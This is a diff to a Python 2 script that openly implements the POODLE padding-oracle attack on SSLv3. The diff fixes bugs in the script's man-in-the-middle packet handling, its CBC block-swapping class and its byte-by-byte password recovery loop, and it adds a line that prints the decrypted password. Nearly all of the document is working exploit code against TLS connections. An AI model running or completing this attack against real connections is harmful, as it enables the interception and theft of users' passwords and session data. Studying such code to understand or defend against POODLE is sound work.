@@ -3,6 +3,7 @@
 import socket
 import sys
 
+TLS_CONTENT_TYPE_APPLICATION_DATA = "\x17"
 BLOCK_LENGTH = 16 # AES-256
 
 MITM_SERVER_ADDRESS = ("127.0.0.1", 4747)
@@ -22,11 +23,13 @@ class PoodlePasswordDecrypter:
 		self.got_password = False
 	
 	def run(self):
+		padding_chars = 0
 		while not self.got_password:
 			char = self.try_decipher_one_char(padding_chars)
 			if char is not None:
 				self.process_new_char(char)
 				padding_chars += 1
+		print self.password
 	
 	def try_decipher_one_char(self, padding_chars):
 		mitm = MitmConnection()
@@ -96,7 +99,7 @@ class MitmPacket:
 		self.block_exchanger = None
 	
 	def process(self):
-		self.process_mitm_packet(packet)
+		self.process_mitm_packet(self.packet)
 	
 	def process_mitm_packet(self, packet):
 		origin = self.__get_origin(packet)
@@ -109,7 +112,7 @@ class MitmPacket:
 		if tls_content_type == TLS_CONTENT_TYPE_APPLICATION_DATA:
 			self.process_client_application_data(data)
 	
-	def process_client_application_data(data):
+	def process_client_application_data(self, data):
 		self.block_exchanger = PoodleBlockExchanger(data)
 		new_data = self.block_exchanger.exchange_blocks()
 		self.send_packet = self.__reasemble_packet(ORIGIN_CLIENT, new_data)
@@ -142,7 +145,7 @@ class PoodleBlockExchanger:
 		last_block_last_byte_plaintext = (BLOCK_LENGTH - 1)
 		second_to_last_block_last_byte_ciphertext = ord(self.second_to_last_block[-1])
 		previous_block_last_byte_ciphertext = ord(self.previous_block[-1])
-		return chr(last_byte_plaintext ^ second_to_last_block_last_byte_ciphertext ^ previous_block_last_byte_ciphertext)
+		return chr(last_block_last_byte_plaintext ^ second_to_last_block_last_byte_ciphertext ^ previous_block_last_byte_ciphertext)
 
 
 if __name__ == "__main__":
